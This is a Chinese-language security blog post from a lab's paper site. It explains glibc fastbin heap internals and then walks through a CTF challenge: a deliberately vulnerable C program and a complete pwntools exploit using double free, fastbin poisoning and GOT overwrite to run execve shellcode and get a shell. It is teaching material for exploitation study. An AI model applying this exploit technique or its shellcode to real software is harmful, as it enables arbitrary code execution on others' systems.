作者： [Hcamael@知道创宇404实验室](http://0x48.pw)  
发布时间：2017-07-25

fastbin相关的堆知识我一年前就学过了，但是都没写啥记录文档，又咸鱼了好长一段时间，要捡回来这块的知识，又重新开始学习了一遍，这篇博文中记录下我对fastbin的个人理解。

#### 基础知识研究

当使用malloc函数第一次向系统申请小于128kb的内存时，会通过sys_brk申请132kb的内存，这块内存就称为堆。

写个测试代码，对着测试代码进行分析(64位系统)：

    
    
    # test.c
    # gcc test.c -o test
    #include <stdio.h>
    #include <stdlib.h>
    
    int main(void)
    {
        char *q;
        char *p;
        int x;
        char input[3];
    
        while(1) {
            read(0,input,3);
            x = atoi(input);
            q = (char *)malloc(x);
            read(0,input,3);
            x = atoi(input);
            p = (char *)malloc(x);
            free(q);
            free(p);
        }
        return 0;
    }

然后使用gdb进行调试(使用peda和libheap插件，这两个都可以在github上搜到)，当第一次调用malloc(0x10)之后，查看内存信息：

    
    
    gdb-peda$ vmmap
    ....
    0x00602000         0x00623000         rw-p  [heap]
    ....

可以看到堆的大小为132kb

先来说下基础概念：

fast
chunk表示正在使用的长度在`32-160`(32位系统是`16-80`)的堆块，而fastbin表示长度在`32-180`范围内的已经释放的堆块

我们可以看源码中的定义：

    
    
    1570    /* The maximum fastbin request size we support */
    1571    #define MAX_FAST_SIZE     (80 * SIZE_SZ / 4)

其中`SIZE_SZ`根据操作系统决定，32位系统为4, 64位系统为8

所以之后又定义了一个fastbin数组，用来存在fastbin：

    
    
    1659      /* Fastbins */
    1660      mfastbinptr fastbinsY[NFASTBINS];

其中`NFASTBINS`是宏定义，一般算出来是10，所以这个数组的长度为10，值为地址，储存fastbin的地址，比如fastbinsY[0]的值为最新释放出来的长度为32的fastbin的地址，fastbin是根据长度存放数组的，所以index=1存放的是48，2->64,
3->80, 4->96, 5->112, 6->128, 7->144, 8->160, 而fastbinsY[9]却用不上，我也不知道为啥.....

但是我却解决了这里的另一个坑，如果我们进行测试，就会发现我们最大malloc(120)，size=128的chunk才是fast
chunk，free后可以放到fastbinsY[6]中去，但是如果我们malloc(128)，free后却放到了unsortbin中去，也就是说index=7
or 8也是用不上的，这里我们看代码:

    
    
    729 #ifndef DEFAULT_MXFAST
    730 #define DEFAULT_MXFAST     (64 * SIZE_SZ / 4)
    731 #endif

这里代码还定义了默认fast的大小为128(32位的为64)，而这个值我们是可以修改的，详情见：<http://man7.org/linux/man-pages/man3/mallopt.3.html>

    
    
           M_MXFAST (since glibc 2.3)
                  Set the upper limit for memory allocation requests that are
                  satisfied using "fastbins".  (The measurement unit for this
                  parameter is bytes.)  Fastbins are storage areas that hold
                  deallocated blocks of memory of the same size without merging
                  adjacent free blocks.  Subsequent reallocation of blocks of
                  the same size can be handled very quickly by allocating from
                  the fastbin, although memory fragmentation and the overall
                  memory footprint of the program can increase.
    
                  The default value for this parameter is 64*sizeof(size_t)/4
                  (i.e., 64 on 32-bit architectures).  The range for this
                  parameter is 0 to 80*sizeof(size_t)/4.  Setting M_MXFAST to 0
                  disables the use of fastbins.

所以默认情况下，fastbin数组的最后3个是不会存储数据的

了解了长度的问题后来说说chunk和bin的问题

一个在使用中的堆就是chunk，当我们free了这个chunk后，就会放入相应的bin中，也就是说当free了fast
chunk，将会把这个chunk存放到fastbin中，如何存放后面说。

我们再来看下面的内容：

    
    
    gdb-peda$ heapls
    [!] No gdb frame is currently selected.
    
               ADDR             SIZE            STATUS
    sbrk_base  0x602000
    chunk      0x602000         0x20            (inuse)
    chunk      0x602020         0x20fe0         (top)
    sbrk_end   0x623000
    gdb-peda$ x/16gx 0x602000
    0x602000:   0x0000000000000000  0x0000000000000021
    0x602010:   0x0000000000000000  0x0000000000000000
    0x602020:   0x0000000000000000  0x0000000000020fe0

还有一个chunk名叫top chunk，这么说吧，在使用的chunk + bin + top chunk的大小就为132kb，看上面的fast
chunk的size=0x20加上top chunk的size=0x20fe0的和为0x21000，也就是sys_brk申请下来132kb的堆大小。

三者之间的逻辑是这样的(默认64位系统，之后都默认了)，首先调用malloc(0x10)，首先去判断fastbinsY[0]是否为空，如果存在一个地址，然后去检测一些有效性啥的，比如size是否为0x20(size
>> 3 << 3,
不算标志位)，如果检测出问题了就抛出异常，否则malloc的返回值就为该地址，然后fastbinsY[0]新的值为：`fastbinsY[0]=fastbinsY[0]->fd`

如果fastbinsY[0]=0的话，则去判断top chunk的大小是否够，如果够就从top chunk中取出，操作大概是这样的:

    
    
    top->size -= 32
    *(top+32) = top->size
    top->size = 0x21
    ret = top + 16
    top = top + 32
    return ret

然后就是free的操作了

PS: 此文只讲fastbin

    
    
    p = malloc(16)
    free(p) ->
    p->fd = fastbinsY[0]
    fastbinsY[0] = p

很简单，fastbin是一个单链表，从上面可以看出这是一个LIFO( _Last in, first out_ 后进先出)

当初我还想了半天为啥使用LIFO，为啥新free的chunk不直接插到屁股，因为我们只有一个fastbinsY[0]指针，如果直接插到屁股的话每次都要迭代到最后一个chunk然后把它的fd赋值为新的chunk的地址，而使用LIFO，我们只需要修改fastbinsY[0]指针的值和新的chunk的值，花费在fastbin链有很多的时候肯定是更少的

#### 结构

原理应该差不多了，然后讲讲结构

我们可以使用libheap来查看现在堆的一些信息：

    
    
    gdb-peda$ heap
    Arena(s) found:
      arena @ 0x7ffff7dd1b20
    gdb-peda$ fastbins
    [!] No gdb frame is currently selected.
    
    fastbins
    [ fb 0 ] 0x7ffff7dd1b28  -> [ 0x0 ] 
    [ fb 1 ] 0x7ffff7dd1b30  -> [ 0x0 ] 
    [ fb 2 ] 0x7ffff7dd1b38  -> [ 0x0 ] 
    [ fb 3 ] 0x7ffff7dd1b40  -> [ 0x0 ] 
    [ fb 4 ] 0x7ffff7dd1b48  -> [ 0x0 ] 
    [ fb 5 ] 0x7ffff7dd1b50  -> [ 0x0 ] 
    [ fb 6 ] 0x7ffff7dd1b58  -> [ 0x0 ] 
    [ fb 7 ] 0x7ffff7dd1b60  -> [ 0x0 ] 
    [ fb 8 ] 0x7ffff7dd1b68  -> [ 0x0 ] 
    [ fb 9 ] 0x7ffff7dd1b70  -> [ 0x0 ] 

首先是arena是什么，这个地址表示的是啥？这个我没找到相关的文章，我是自己解决的，首先我使用`vmmap`先查看这个地址属于哪:

    
    
    gdb-peda$ vmmap
    Start              End                Perm  Name
    ......
    0x00007ffff7dd1000 0x00007ffff7dd3000 rw-p  /lib/x86_64-linux-gnu/libc-2.23.so
    ......

然后发现这个地址是属于libc的，然后猜测应该是malloc相关的，再加上发现arena+8是fastbin，然后我在malloc.c中找到了一个结构体：

    
    
    1651    struct malloc_state
    1652    {
    1653      /* Serialize access.  */
    1654      __libc_lock_define (, mutex);
    1655    
    1656      /* Flags (formerly in max_fast).  */
    1657      int flags;
    1658    
    1659      /* Fastbins */
    1660      mfastbinptr fastbinsY[NFASTBINS];
    1661    
    1662      /* Base of the topmost chunk -- not otherwise kept in a bin */
    1663      mchunkptr top;
    1664    
    1665      /* The remainder from the most recent split of a small request */
    1666      mchunkptr last_remainder;
    1667    
    1668      /* Normal bins packed as described above */
    1669      mchunkptr bins[NBINS * 2 - 2];
    1670    
    1671      /* Bitmap of bins */
    1672      unsigned int binmap[BINMAPSIZE];
    1673    
    1674      /* Linked list */
    1675      struct malloc_state *next;
    1676    
    1677      /* Linked list for free arenas.  Access to this field is serialized
    1678         by free_list_lock in arena.c.  */
    1679      struct malloc_state *next_free;
    1680    
    1681      /* Number of threads attached to this arena.  0 if the arena is on
    1682         the free list.  Access to this field is serialized by
    1683         free_list_lock in arena.c.  */
    1684      INTERNAL_SIZE_T attached_threads;
    1685    
    1686      /* Memory allocated from the system in this arena.  */
    1687      INTERNAL_SIZE_T system_mem;
    1688      INTERNAL_SIZE_T max_system_mem;
    1689    };

然后发现：

    
    
    gdb-peda$ x/16gx 0x7ffff7dd1b20
    0x7ffff7dd1b20 <main_arena>:    0x0000000000000000  0x0000000000602000
    0x7ffff7dd1b30 <main_arena+16>: 0x0000000000000000  0x0000000000000000
    0x7ffff7dd1b40 <main_arena+32>: 0x0000000000000000  0x0000000000000000
    0x7ffff7dd1b50 <main_arena+48>: 0x0000000000000000  0x0000000000000000
    0x7ffff7dd1b60 <main_arena+64>: 0x0000000000000000  0x0000000000000000
    0x7ffff7dd1b70 <main_arena+80>: 0x0000000000000000  0x0000000000602040

`0x7ffff7dd1b78`的值为top chunk的地址然后就知道我应该是没找错了，这块区域就是各类bin的链首，其他的small, large,
unsort bin之类的都是存储在`mchunkptr bins[NBINS * 2 - 2];`之中，找到一篇文章中是有介绍的:

>   * Bin 1 – Unsorted bin
>   * Bin 2 to Bin 63 – Small bin
>   * Bin 64 to Bin 126 – Large bin
>

这些以后研究，继续看fastbin

我们再来看chunk的结构，定义在malloc.c中：

    
    
    1040    struct malloc_chunk {
    1041    
    1042      INTERNAL_SIZE_T      mchunk_prev_size;  /* Size of previous chunk (if free).  */
    1043      INTERNAL_SIZE_T      mchunk_size;       /* Size in bytes, including overhead. */
    1044    
    1045      struct malloc_chunk* fd;         /* double links -- used only if free. */
    1046      struct malloc_chunk* bk;
    1047    
    1048      /* Only used for large blocks: pointer to next larger size.  */
    1049      struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */
    1050      struct malloc_chunk* bk_nextsize;
    1051    };
    ......
    1068        An allocated chunk looks like this:
    1069    
    1070    
    1071        chunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    1072                |             Size of previous chunk, if unallocated (P clear)  |
    1073                +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    1074                |             Size of chunk, in bytes                     |A|M|P|
    1075          mem-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    1076                |             User data starts here...                          .
    1077                .                                                               .
    1078                .             (malloc_usable_size() bytes)                      .
    1079                .                                                               |
    1080    nextchunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    1081                |             (size of chunk, but used for application data)    |
    1082                +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    1083                |             Size of next chunk, in bytes                |A|0|1|
    1084                +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    ......
    1094        Free chunks are stored in circular doubly-linked lists, and look like this:
    1095    
    1096        chunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    1097                |             Size of previous chunk, if unallocated (P clear)  |
    1098                +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    1099        `head:' |             Size of chunk, in bytes                     |A|0|P|
    1100          mem-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    1101                |             Forward pointer to next chunk in list             |
    1102                +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    1103                |             Back pointer to previous chunk in list            |
    1104                +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    1105                |             Unused space (may be 0 bytes long)                .
    1106                .                                                               .
    1107                .                                                               |
    1108    nextchunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    1109        `foot:' |             Size of chunk, in bytes                           |
    1110                +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    1111                |             Size of next chunk, in bytes                |A|0|0|
    1112                +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+

上面这么代码和注释这么多是针对整体的chunk来说的，而我这篇文章中是针对fast chunk和fast bin进行研究.

对于fast
chunk其实就一个有用的字段，就是size，表示当前chunk的大小，然后size的低三bit位是标志位，为什么size的最后三bit能是标志位，因为在32位系统中，chunk永远是8的倍数，然后写代码的人秉持了不浪费任何一bit的原则，这最后3bit就被哪来做标志位了，不过在64位系统中，chunk是16的倍数，所以讲道理，在64位系统中size的低4bit都是能拿来做标志位的，但是我猜测，应该是64位系统和32位相比没有多啥需要标志位的功能，所以任然是使用低三bit做标志位。

然后在做Pwn的时候就标志位P有用吧，表示上一个chunk是否在使用中，不过在fast
chunk/bin中P标志位永远是1，free操作并不会修改fastbin的标志位，所以pre_size，前一个不在使用中的chunk的大小，因为P=1，所以在fastbin中这个字段可以说是没用的，其实还是有用的，后面说。

因为chunk总是16的倍数，所以当我们malloc(0-16)的时候，得到的chunk的size就是存放数据的16byte加上chunk
header，也就是8byte的pre_size，和8byte的size，所以malloc得到的最小的chunk大小为32byte。

但是当我测试的时候发现，我malloc(0-24)得到的chunk大小都为0x20,
当我malloc(25-40)得到的chunk大小为0x30，按我的理解，这是因为malloc的作者是告诉你可以把pre_size利用起来

当我malloc(24)的时候，得到size=0x20的chunk，其中有0x10的chunk
header，然后有0x10的地方存放data，然后仔细研究会发现，还有8byte的下一个chunk的pre_size可以存放数据，因为当前chunk肯定是使用中的，所以下一个chunk的标志位P=1，pre_size没用，所以可以被上一个chunk利用，当free的时候，再往下一个chunk的pre_size设置值，所以按作者的想法应该是这样能达到最大利用率。

然后就是fastbin了，其实fastbin和fast
chunk比，就是多了一个fd，在fastbin单链表中起作用，前面已经说了。因为是单链表，所以bk没用。

写了这么多，个人感觉应该是写清楚了，就留了一个坑吧——fastbinsY[9]有啥作用？

#### 在Pwn题中fastbin的利用

    
    
    # mistake.c
    # gcc mistake.c -z execstack -o mistake
    #include <stdio.h>
    #include <stdlib.h>
    
    typedef struct chunk{
        char buffer[0x10];
        int len;
    }chunk;
    
    chunk* list[0x30];
    int chunk_number;
    
    void menu()
    {
        write(1,"1.create\n",9);
        write(1,"2.read\n",7);
        write(1,"3.free\n",7);
        write(1,"4.bye\n",6);
        write(1,"> ",2);
    }
    
    int transfer(char* buffer){
        int i,result = 0;
        for(i = 0;*(buffer+i) != 0;i++){
            if(*(buffer+i) > '9'||*(buffer+i) < '0'){
                return -1;
            }
            result = result*10 - '0' + *(buffer+i);
        }
        return result;
    }
    
    int read_int(){
        int i,result;
        char buffer[11];
        for(i = 0;i < 10;i++){
            read(0,buffer+i,1);
            if(*(buffer+i) == '\n'){
                break;
            }
        }
        *(buffer+i) = 0;
        if((result = transfer(buffer)) == -1){
            write(1,"Invalid input.\n",15);
            return -1;
        }
        return result;
    }
    
    void create_chunk()
    {
        if(chunk_number > 0x2f){
            write(1,"no more chunk.\n",15);
            return;
        }
        chunk_number++;
        chunk* tmp = (chunk*)malloc(0x14);
        write(1,"content: ",9);
        tmp->len = read(0,tmp->buffer,0x10);
        list[chunk_number] = tmp;
        write(1,"create successfully.\n",21);
    }
    
    void read_chunk()
    {
        int id;
        write(1,"id: ",4);
        if((id = read_int()) == -1){
            return;
        }
        if(id > chunk_number){
            write(1,"Index out of range.\n",20);    
            return;
        }
        write(1,list[id]->buffer,list[id]->len);
    }
    
    void free_chunk(){
            int id,i;
            write(1,"id: ",4);
        if((id = read_int()) == -1){
            return;
        }
            if(id > chunk_number){
                    write(1,"Index out of range.\n",20);
            return;
            }
        free(list[id]);
        chunk_number--;
        for(i = id;i < 0x2f;i++){
            list[i] = list[i+1];
        }
        write(1,"delete successfully\n",20);
    }
    
    int main(void){
        chunk_number = -1;
        char input[2];
        int selete;
        while(1){
            menu();
            read(0,input,2);
            input[1] = 0;
            if(!(selete = atoi(input))){
                write(1,"Invalid input.\n",15);
                continue;
            }
            switch(selete){
            case 1:
                create_chunk();
                break;
            case 2:
                read_chunk();
                break;
            case 3:
                free_chunk();
                break;
            case 4:
                write(1,"bye~\n",5);
                return 0;
            default:
                write(1,"Invalid input\n",15);
            }
        }
    }

题目是协会的一个学弟(@spine)出的

再给个Dockerfile吧：<https://github.com/Hcamael/docker_lib/tree/master/heap/mistake>

这题感觉对于新手挺有难度的，第一次做的时候花了很长时间，然后现在复习还花了很长时间捡起来

这题的漏洞点在一个很小的地方，在`create_chunk`，这里对输入进行检查，chunk_number的最大值为0x2f，看着是没问题，但是再判断完以后让chunk_number进行自增，也就是到0x30了，list[0x30]是不是溢出了？但是这里溢出看着危害好像不大，但是进过一系列细微的操作，可以造成double
free.

我想了很久要怎么总结pwn题，最后觉得还是一开始先点出漏洞点，然后贴出payload，再对payload进行解释，所以，payload如下：

    
    
    #!/usr/bin/env python
    #-*- coding:utf-8 -*-    
    from pwn import *
    
    # context.log_level = 'debug'
    
    shellcode1 = "jhH\xb8/bin///sP\xeb\x21"
    shellcode2 = "H\x89\xe71\xf6j;X\x99\x0f\x05"
    p = process('./mistake')
    
    def double_free():
        p.sendline('3')
        p.sendline('47')
        print p.recv()
        p.sendline('3')
        p.sendline('0')
        print p.recv()
        p.sendline('3')
        p.sendline('46')
        print p.recv()
    
    def malloc_fd():
        p.sendline('1')
        p.sendline(p64(0x602080-8))
        print p.recv()
        p.sendline('1')
        p.sendline(shellcode2)
        print p.recv()
        p.sendline('1')
        p.sendline(shellcode2)
        print p.recv()
    
    def free_del():
        for x in xrange(3):
            p.sendline('3')
            p.send(str(0xfffffffd))
            print p.recv()
    
    def create_chunk():
        for x in xrange(0x31):
            p.sendline('1')
            print p.recv()
            if x == 1:
                p.sendline(p64(0)+p64(0x21))
            else:
                p.sendline(shellcode2)
            print p.recv()
    
    create_chunk()
    print "===create over=========="
    double_free()
    print "====double free over===="
    free_del()
    print "=====del over=========="
    malloc_fd()
    
    # 控制chunk_number
    p.sendline('1')
    p.send(p64(0xffffffef))
    
    print p.recv()
    
    p.sendline('3')
    p.send('4294967291')
    print p.recv()
    
    p.sendline('1')
    p.sendline(shellcode1)
    
    p.interactive()

之前程序里写了编译方式，这题我们是关闭NX的，所以就要想着怎么可以执行shellcode

再讲payload的时候，先提下，我们需要关注几个地方，一个是存放chunk地址的list，还有就是使用libheap的fastbins命令查看fastbin情况

payload的第一步是`create_chunk()`函数，创造出最大值0x31个chunk，chunk的赋值之后就知道其意义

这个时候list的情况：

    
    
    list[0]
    list[1]
    list[2]
    ......
    list[46]
    list[47]
    ----overflow----    list[48]

然后就会产生2free了，看`double_free()`，首先是只有free(list[47])操作，我们list[47]的值称为list47，这个时候`fastbin
-> list47`

第二次是free(list[0])，我们把list[0]称为list0，这个时候

    
    
    fastbin -> list0
    list0.fd -> list47

但是除了free的操作，还会进行清除list[0]的移位操作：

    
    
    list[0] = list[1]
    list[1] = list[2]
    ......
    list[45] = list[46]
    list[46] = list[47]

然后我们再free(list[46])，这个时候list[46]的值为list47，而list47是被free过的，所以就造成了double free

这个时候

    
    
    fastbin -> list47
    list47.fd -> list0
    list0.fd -> list47

然后，就涉及到了第二个bug，`int
chunk_number;`，chunk_number的值为int，所以在free_chunk函数中，id>chunk_number的比较可以让id为负数来bypass

看之后的payload，free了3次list[-3] (list[-3] == list[0xfffffffd])

    
    
    .bss:0000000000602080 chunk_number    dd
    .bss:0000000000602084                 align 20h
    .bss:00000000006020A0                 public list
    .bss:00000000006020A0 ; void *list

通过ida可以看到list[-3]的地址为0x0602088，值为0(不知道为啥list和chunk_number之间有28byte没被使用的内存)

所以我们实际执行的是3次free(0)，而该操作并不会改变啥，所以实际的效果只有：

    
    
    list[-3] = list[0]
    list[-2] = list[1]
    list[-1] = lsit[2]
    ......
    list[44] = list[47]
    list[45] = list[47]
    list[46] = list[47]

但是和刚执行完`create_chunk`后的初始结果相比，是这样的:

    
    
    list[-3] = list[1]
    list[-2] = list[2]
    list[-1] = lsit[3]
    ......
    list[43] = list[47]
    list[44] = list[47]
    list[45] = list[47]
    list[46] = list[47]

这个时候执行`malloc_fd`函数，我们回头再看看现在fastbin的情况：

    
    
    fastbin -> list47
    list47.fd -> list0
    list0.fd -> list47

所以，第一次malloc，我们得到的是list47的地址，然后在list47.fd的位置写入了`p64(0x602080-8)`

第二次malloc，获取到的是list0的地址

第三次malloc，获取到又是list47的地址，这个时候，fastbin将会指向list47的fd：

    
    
    fastbin -> 0x602078

为什么我们让fastbin指向这个地址？因为fastbin在malloc的时候会对size进行检查，也就是检查address+8的值是否为合法size

如果fastbin指向0x602078，则会检查0x602080是否是合法size，这个地址为存储的是chunk_number，我们可以仔细计算下，这个时候的chunk_number=0x2e(0b101110)，是一个合法的地址，所以这个时候我们可以成功malloc，返回地址0x602088，然后更新fastbin，fastbin指向的是0x602078的fd，也就是0x602088，这个地址是list[-3]，
根据上面分析的，这个值也就是初始的list[1]，所以在payload中，我们在这个位置写入的是`p64(0)+p64(0x21)`，为了之后能成功malloc所伪造的头。

这时的fastbin:

    
    
    fastbin -> old_list1

然后我们向0x602088写入0x10byte的数据，我们在这个地方写入的是p64(0xffffffef)，也就是-17

之后我们再free(list[-5]) -> free(*0x602078) -> free(0)，
不会发生啥，但是free_chunk除了调用free函数外还有一个操作：

    
    
    list[-5] = list[-4]
    list[-4] = list[-3]
    ......
    其中
    list[-4] = 0x602080        
    list[-3] = 0x602088

其中0x602080为chunk_number的地址，所以经过这个操作后，chunk_number的地址被修改为了0x602088地址的值，在上面我们可以看到，值为0xffffffef

最后一步，首先是chunk_number自增，得到0xfffffff0

然后是malloc获得old_list1 + 16地址，写入shellcode

然后在源码中的操作是：

    
    
    list[chunk_number] = tmp;

list的地址是0x6020a0

chunk_number的值为0xfffffff0

所以最后是向0x6020a0 + 8*0xfffffff0 = 0x602020地址写入old_list1 + 16(也就是shellcode地址的值)

在我编译出来的程序中

    
    
    .got.plt:0000000000602020 off_602020      dq offset write      

0x602020是write的got地址，所以修改了write的got表地址为shellcode地址

所以之后调用write，将会跳到shellcode地址，因为NX没开，所以堆栈可执行，可以成功执行shellcode，导致getshell

PS：payload中的shellcode2没啥用，只是我测试时候用的，这个相当于padding，看payload的时候别纠结这个，之前输入有意义的一个是list[1]构造chunk
header，一个就是最后的shellcode1了，其他的基本算是padding

#### 参考：

  1. [malloc.c](https://code.woboq.org/userspace/glibc/malloc/malloc.c.html)
  2. [Heap Exploitation](https://www.slideshare.net/AngelBoy1/heap-exploitation-51891400?ref=http://4ngelboy.blogspot.com/)
  3. [Understanding glibc malloc](https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/comment-page-1/)
  4. [Syscalls used by malloc](https://sploitfun.wordpress.com/2015/02/11/syscalls-used-by-malloc/)
  5. [Double Free浅析](http://static.hx99.net/static/drops/binary-7958.html)

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/445/>

